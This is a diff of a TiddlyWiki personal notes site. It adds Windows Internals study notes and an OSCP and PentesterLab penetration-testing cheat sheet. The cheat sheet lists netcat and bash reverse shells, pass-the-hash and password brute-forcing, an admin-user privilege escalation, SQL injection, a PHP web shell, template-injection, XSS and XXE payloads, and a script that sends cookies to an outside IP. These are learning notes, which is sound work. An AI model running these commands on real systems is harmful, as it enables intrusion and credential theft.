@@ -164,6 +164,10 @@ Error message and password prompt
 
 <li>10. Memory Management - Part 3</li>
 
+<li>11. Interrupts</li>
+
+<li>12. Exceptions</li>
+
 <li>2. System Architecture - Part 1</li>
 
 <li>3. System Architecture - Part 2</li>
@@ -223,6 +227,8 @@ Error message and password prompt
 <li>Malware Analysis Notes - 7</li>
 
 <li>Malware Analysis Notes - 8</li>
+
+<li>OSCP Notes</li>
 
 <li>PentesterLab Notes</li>
 
@@ -8617,7 +8623,7 @@ Tool: Bytecode viewer by Konloch, javap (disassembler), javac (compiler).</pre>
 <div created="20180424234616405" modified="20180517191701014" title="$:/state/tab/sidebar--1835078512">
 <pre>$:/core/ui/SideBar/Recent</pre>
 </div>
-<div list="[[ISITDTU CTF 2018 Quals]] About" title="$:/StoryList">
+<div list="[[PentesterLab Notes]] [[PentesterLab Notes - Essential Badge]]" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -8805,8 +8811,79 @@ Chunks of memory used by processes are called pages, which are 4kilobytes big. T
 
 Objects and handles: some examples of objects: process, mutex, event, desktop, file, and etc. objects can be accessed by kernel code directly. User mode code has to use handles to access objects. </pre>
 </div>
-<div created="20180730001800924" modified="20180730001800924" title="10. Memory Management - Part 3">
-<pre></pre>
+<div created="20180730001800924" modified="20180730192659330" title="10. Memory Management - Part 3">
+<pre>Kernel and driver memory usage:
+non-pageable code. Code that can't be paged out. , 
+Pageable code - similar to user mode code that can be paged out., 
+File system cache, 
+Non-paged pool, 
+Paged pool
+
+Memory allocation API: ExAllocatePool - allocate memory from paged or non-paged pool. ExAllocatePoolWithTag - allocate memory with 4-byte tag, used for tracking leaks. exfreepool - to free memory. Tool: Poolmon.exe 
+
+memory mapped files api - CreateFileMapping - create a file mapping object based on a specific file. OpenFileMapping - open memory maped file based on name. MapViewOfFile(Ex) - create a view into MMF. 
+
+Viewing memory info- task manager, process explorer, performance monitor
+
+Virtual Address Descriptors (VADs) - binary tree structure. </pre>
+</div>
+<div created="20180730192716549" modified="20180730194507052" tags="" title="11. Interrupts">
+<pre>Trap dispatching:
+
+Trap - interrupt or exception. Divert code from normal flow. 
+
+Trap dispatching - kernel mechanism for capturing an executing thread's state. 
+
+Interrupt - asynchronous event. unreleated to current executing code.
+
+Exception - synchronous. has to do with code. may be reproducible. 
+
+hardware interrupts:
+
+Device connect to CPU with interrupt controller in the middle. (IRQ 0, 1, ..)
+
+Interrupt dispatching: Interrupt happens -&gt; Record CPU state -&gt; call appropirate interrupt service routine -&gt; after routine is finished, CPU state is restored. 
+
+Process Explorer shows Interrupts as a process but it isn't process. Procexp shows how much CPU is used for interrupts. 
+
+Device manager -&gt; device properties -&gt; Resources tab shows IRQ number for the device. 
+
+Interrupt request level (IRQL) - each interrupt has IRQL associated with it. It's priority for the interrupt. 
+
+IRQL levels - Passive_level (0), apc_level (1), dispatch_level (2), device IRQL(3-26, or 3-11) and there are more IRQL level...
+
+</pre>
+</div>
+<div created="20180730194508972" modified="20180730201225374" tags="" title="12. Exceptions">
+<pre>Exception Dispatching
+
+Exception - Caused by code executing. Divide by zero, access violation, stack overflow, and etc... May be reproduceable
+
+Structured Exception Handling (SEH) - provided by Windows OS for dealing with exceptions. 
+
+Exceptions are connected to Interrupt dispatch table (IDT). There is state saving then jumping to handler. 
+
+In Windbg, !idt shows IDT.
+
+Exception handling: breakpoint is an exception (int 03), handled transparently.
+
+Unhandled exception from kernel code generates BSOD.
+
+Exception occurs -&gt; switch to kernel mode -&gt; create trap frame (record state) -&gt; look for handler -&gt; execute handler if found, else crash. Exception handled in user mode is different.
+
+SEH - _try, _except, _finally, _leave. 
+
+System Crash: BSOD - Occurs because of kernel mode exception, which was unhandled. Most of the time it occurs because device drivers. 
+
+if system crashes, crash dump is written which can be analyzed with a debugger.
+
+Tool: Notmyfault.exe uses myfault.sys to crash a system. Part of sysinternals.
+
+```
+windbg !analyze -v for analyzing memory.dump files.
+```
+
+</pre>
 </div>
 <div created="20180516180855059" modified="20180516191145694" tags="" title="2. System Architecture - Part 1">
 <pre>Windows Design Goals:
@@ -9068,7 +9145,7 @@ Heap manager manages small allocations 8 bytes minimum
 
 Default Process heap is always created when process is created. GetProcessHeap returns handle to this heap. HeapCreate can create more heap. Heap size can be fixed or grow. Default is growable. Low Fragmentation Heap (LFH) deals with memory fragmentation issues.</pre>
 </div>
-<div created="20180424234251670" modified="20180708205852216" tags="" title="About">
+<div created="20180424234251670" modified="20180730180344575" tags="" title="About">
 <pre>This page contains random notes.
 Blog: &lt;a href=&quot;http://boredhackerblog.info&quot;&gt;http://boredhackerblog.info&lt;/a&gt;
 
@@ -9093,7 +9170,8 @@ Notes:
 [[Binary Exploitation Notes]]
 
 [[VulnHub Notes]]
-</pre>
+
+[[OSCP Notes]]</pre>
 </div>
 <div created="20180624224949924" modified="20180624225133392" title="Binary Exploitation Notes">
 <pre>Notes for RPI Modern Binary Exploitation course (https://github.com/RPISEC/MBE), Hacking, 2nd Edition book, and Shellcoders handbook.
@@ -10396,6 +10474,316 @@ Online disassembler / ODA maybe useful for shellcode analysis.
 
 C++ analysis and 64-bit malware are skipped.</pre>
 </div>
+<div created="20180730180417654" modified="20180730182427468" title="OSCP Notes">
+<pre>Found my OSCP notes from 2016. Just dumping them here. Some of the notes may or may not be relevant or accurate anymore. 
+
+Some commands
+
+```
+nc - netcat...
+nc trasfer files - nc -lvp 8000 and nc IP 8000 &lt; file
+nc bind - nc -lvp 8000 -e cmd.exe
+nc reverse - nc -lvp 8000 and nc IP 8000 -e cmd.exe
+ncat - ncat --exec cmd.exe --ssl
+tcpdump - 
+tcpdump -n src host XXX.XXX.XXX.XXX -r file.pcap 
+tcpdump -n dst host XXX.XXX.XXX.XXX -r file.pcap 
+tcpdump -n port 81 -r file.pcap 
+tcpdump -nX -r file.pcap - hex output
+bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1 - reverse shell
+whois - whois...
+```
+
+Enum
+
+```
+nc -nvv -w 1 -z IP port-port - connect port scan
+nc -unvv -w 1 -z IP port-port - udp scan
+
+nmap -sn IP, IP_Range - network sweep, ping/icmp scan 
+nmap -oG - grepable output
+nmap -sT --top-ports 20 - top 20 open ports, tcp connect
+-A agressive
+
+SMB enum
+nbtscan IP, IP_RANGE
+
+SMB null session
+rpcclient -U &quot;&quot; IP
+srvinfo - sys info
+enumdomusers - domain users
+getdompwinfo - password policy
+
+enum4linux -v IP - verbose mode
+nmap --script smb-enum-users - enum smb usernames...
+--smb-check-vulns - check smb vuln.
+
+SMTP
+nc -nv IP 35
+VRFY USERNAME - verify username for user on the system
+
+SNMP
+nmap -sU (udp) -p 161 (snmp)
+onesixyone -c dict.txt (community strings) IP
+-i list of IP's
+
+snmpwalk -c community_string -v1 IP
+
+openvas
+openvas-setup - install/setup
+https://localhost:9392 - openvas webserver
+username: admin
+```
+
+file transfer
+
+```
+tftp
+atftpd --daemon --port 69 /TFTPDIR
+tftp -i IP GET (or PUT) file.exe
+
+ftp
+ftp -s:commands.txt
+bin command to switch to binary mode
+
+wget.vbs
+cscript wget.vbs http://IP/file.exe
+
+powershell-download
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+```
+
+intel
+
+```
+email
+theharvester -d domain.com -b search engine (google,bing) -l  int (limit?) 
+
+netcraft - site and domain info
+
+recon-ng - osint framework
+
+DNS
+forward lookup
+	host -t ns domain.com - get list of name servers
+	host -t mx domain.com - get list of mail servers
+	host www.domain.com - get IP for a server
+	
+	for name in list: host $name.domain.com
+reverse lookup
+	host IP - gives you domain name if PTR is configured
+	for IP in a list: host $IP
+	
+DNS zone transfers
+	zone file - list of all DNS names for the zone
+	host -t ns domain.com - get list of name servers
+	host -l domain.com ns.domain.com - do zone transfer
+
+dnsrecon -d domain.com -t axfr
+dnsenum domain.com
+```
+
+passwords
+
+```
+Tools:
+crunch - generates password
+crunch 6 6 CHARSET -o list.txt
+crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha -o mixalpha.txt
+crunch 8 8 -t ,@@^^%%%  // % number, ^ special char, ,@ letters
+
+fgdump.exe dump hashes into text file.
+Windows hashes: USER:ID:LM:NTLM
+
+WCE - windows credential editor
+
+wce64.exe -w
+print username and password.
+
+Pass the hash:
+USER:ID:EMPTY_LM_HASH:NTLM
+export hashes to SMBHASH
+
+pth-winexe -U administrator% IP cmd      GET SHELL
+
+CEWL
+cewl www.megacorpone.com -m 6 -w savefile.txt
+
+Medusa
+medusa -h IP -u admin -P passwordfile.txt -M http -m DIR:/admin -T 20
+
+Ncrack
+ncrack -v -f --user administrator -P passwordfile.txt rdp://IP,CL=1
+
+Hydra
+hydra -l admin -P passwordfile.txt -v IP ftp
+
+SAM file
+C:\Windows\system32\config\SAM or system
+C:\Windows\repair\SAM or system
+
+samdump2 system SAM outputs hashes
+```
+
+privesc
+
+```
+sc qc upnphostsc config upnphost binpath= &quot;net user &lt;username&gt; /add&quot;
+sc config upnphost obj= &quot;.\LocalSystem&quot; password =&quot;&quot;
+net stop upnphost
+net start upnphost
+
+http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html
+
+http://www.fuzzysecurity.com/tutorials/16.html
+
+icacls filename.exe
+Everyone:&lt;CI&gt;&lt;F&gt; Full permissions
+
+Linux - World writeable files
+ find / -perm -2 ! -type l -ls 2&gt; /dev/null
+```
+
+tunneling
+
+```
+port forwarding
+rinetd
+/etc/rinetd.conf
+
+BINDIP BIND_PORT CONNECT_IP CONNECT_PORT
+
+SSH
+plink.exe
+reverse ssh tunnel
+victim: plink -l root -pw password IP -R 3390:localhost:3389
+attacker: 3390 on localhost is forwarded to victim.
+
+dynamic port forwarding
+ssh -D 8080 root@IP
+All traffic passed to 8080 (via socks4 proxy) will go into victim machine.
+
+proxychains
+/etc/proxychains.conf
+socks4 IP 8080
+
+proxychains COMMAND
+
+http_tunnel
+stunnel
+```
+
+webapps
+
+```
+SQL Injection
+show databases; look at databases
+show tables; see tables
+use table; use table
+any' OR 1=1 limit 1;#
+
+Union all select 1,2,3,@@version,5
+user() mysql login username
+@@version mysql version
+
+union all select 1,2,3,table_name,5 from information_schema.tables - list all of the tables.
+
+-sleep(5)  - mysql sleep for 5 seconds.
+
+-IF(MID(@@version,1,1) = '5', SLEEP(5), 0) check of first char is 5 then sleep if true.
+
+SQLMap
+sqlmap -u http://IP --crawl 1 //search for vulns
+sqlmap -u http://IP/vuln=1 --dbms=mysql --dump --threads 5 //dump the database
+sqlmap -u http://IP/vuln=1 --dbms=mysql --os-shell //load file and give us shell
+
+webdav
+copy stuff.txt stuff.asp;.txt
+
+wordpress wpscan -u URL
+
+upload https://pentestlab.wordpress.com/2012/11/29/bypassing-file-upload-restrictions/
+file.php%00.jpg
+file.php;.jpg
+
+Javascript send cookies:
+&lt;script&gt; new Image().src=&quot;http://IP/stuff.php?output=&quot;+document.cookie;&lt;/script&gt;
+```
+
+random
+
+```
+find . -exec bash -i \;
+sudo find /etc -exec ls -ld {} \;
+
+sudo python
+import os
+os.system('/bin/bash')
+
+linux setuid programs:
+find / -user root -perm -4000 -exec ls -ld {} \; &gt; /tmp/holes
+cron.d directory writable?
+sudo vi...
+:shell for shell
+sudo less ...
+v //for vi
+:shell
+sudo more...
+?
+!bash
+
+python PTY
+python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+export TERM=linux
+
+mount share windows
+net use Z: \\share
+searching for groups.xml:
+dir /s groups.xml
+Groups.xml has stored password
+gpp-decrypt decrypts this password
+
+winexec -U Administrator%Password //IP &quot;cmd&quot;
+
+net user hacker hacker /add
+net localgroup administrators hacker /add
+
+pyinstaller2.0
+pyinstaller.py --onefile test.py 
+
+Cross-compiling
+apt-get install mingw32
+i586-mingw32...-gcc code.c -lws2_32
+
+Exploitation
+mona.py
+!mona modules - display list of modules (dlls) being used
+searching for commands - search for &gt; command (control + f) or sequence
+commands in non-executables: click &quot;m&quot; for modules/sections. 
+nasm_shell prints opcodes
+jmp esp = ffe4
+!mona find -s &quot;\xff\xe4&quot; -m SLMFC.dll
+
+UDP 161
+nmap -sU --open -p 161 IP
+onesixyone 
+community strings- public, private, manager
+onesixyone -c commstrings(text file) -i ips(text file)
+
+SMTP
+nc -nv IP 25
+VRFY bob //verify username
+
+SMB null session
+rpcclient -U &quot;&quot; IP, empty password
+srvinfo - more info on the OS
+enumdomusers - list of usernames
+getdompwinfo - password policy
+
+enum4linux -v IP
+nmap --script smb-enum-users, smb-check-vulns
+```</pre>
+</div>
 <div created="20180520170028027" modified="20180520170034810" title="PentesterLab Notes">
 <pre>I've had PentesterLab Pro access for a while (1+ years) and I'm finally going through the modules. Taking notes because they may be useful to me or someone else.
 
@@ -10409,7 +10797,7 @@ Here's a referral link if you want to sign up for PentesterLab:  https://pentest
 
 [[PentesterLab Notes - White Badge]]</pre>
 </div>
-<div created="20180520165112246" modified="20180529205404565" tags="" title="PentesterLab Notes - Essential Badge">
+<div created="20180520165112246" modified="20180730231136505" tags="" title="PentesterLab Notes - Essential Badge">
 <pre>There isn't much to note here since most of the exercise involve messing with HTTP requests and parameters. 
 
 Use Burp and advanced scope with .*libcurl.so as the host.
@@ -10450,8 +10838,62 @@ https://www.owasp.org/index.php/LDAP_Injection_Prevention_Cheat_Sheet
 
 https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006)
 
-MongoDB: || 1==1 (sql: or 1=1). %00 works as well. ``//`` and ``&lt;!--`` can be used for commenting things out.
+MongoDB: || 1==1 (sql: or 1=1). ``//`` and ``&lt;!--`` can be used for commenting things out.
 
+Redirection: http://SITE/redirect.php?uri=/ can be replaced with http://SITE/redirect.php?uri=OTHERSITE OR http://SITE/redirect.php?uri=//OTHERSITE 
+
+SSRF: modify URL to point to localhost/127.0.0.1/0.0.0.0 or localhost/127.0.0.1/0.0.0.0:port.  Having a custom domain pointing to 127.0.0.1 can bypass filtering as well.
+
+template injection testing: ``{{'7'*7}}`` expected output 7777777 or 49.
+
+```
+{{''.__class__.mro()[1].__subclasses__()}} //1 can be changed
+
+{{''.__class__.mro()[1].__subclasses__()[INT]}} // 1 and INT can be changed too
+
+{{''.__class__.mro()[1].__subclasses__()[INT](ARGS)}} // replace 1, INT, ARGS
+
+twig; {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('command')}}
+```
+
+php command execution (file name extension can be php, php3)
+
+```
+&lt;?php
+  system($_GET[&quot;cmd&quot;]);
+?&gt;
+
+/?cmd=command
+```
+
+XSS
+
+```
+&lt;script&gt;alert('text')&lt;/script&gt;
+
+if script is filtered:
+&lt;sCript&gt;alert('text')&lt;/sCript&gt;
+
+if script is filtered and removed:
+&lt;sc&lt;script&gt;ript&gt;alert('text')&lt;/sc&lt;/script&gt;ript&gt;
+
+onmouseover onclick, onerror, and etc can help too.
+
+// to comment out stuff
+
+
+```
+
+String.fromcharcode: 
+https://www.martineve.com/2007/05/15/javascript-eval-string-fromcharcode-encoder/
+
+XML
+
+```
+&lt;!DOCTYPE test [&lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;test&gt;%26x;&lt;/test&gt; 
+
+// %26 is &amp; url encoded.
+```
 </pre>
 </div>
 <div created="20180519151923785" modified="20180520165814532" tags="" title="PentesterLab Notes - Unix Badge">
@@ -10595,7 +11037,7 @@ Accessing the container: http://YOUR_IP:8080/ login: test/test
 
 [ext[Notes|./vulnhub/index.html]]</pre>
 </div>
-<div created="20180516170408208" modified="20180730001738718" tags="" title="Windows Internals Notes">
+<div created="20180516170408208" modified="20180730194535515" tags="" title="Windows Internals Notes">
 <pre>PluralSight has three Windows Internals courses presented by Pavel Yosifovich. 
 
 You can find them here: https://www.pluralsight.com/courses/windows-internals
@@ -10624,6 +11066,10 @@ My notes will contain information from viewing the PluralSight course. I'll try 
 [[9. Memory Management - Part 2]]
 
 [[10. Memory Management - Part 3]]
+
+[[11. Interrupts]]
+
+[[12. Exceptions]]
 
 Viewing the course is recommended. </pre>
 </div>
